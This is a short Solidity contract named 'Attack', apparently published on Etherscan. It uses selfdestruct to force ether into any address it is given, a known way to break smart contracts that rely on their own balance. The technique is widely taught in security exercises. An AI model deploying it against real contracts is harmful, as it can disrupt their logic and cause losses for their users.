/**
 *Submitted for verification at Etherscan.io on 2021-10-27
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack {
    function attack(address _address) public payable {
        address payable addr = payable(_address);
        selfdestruct(addr);
    }
}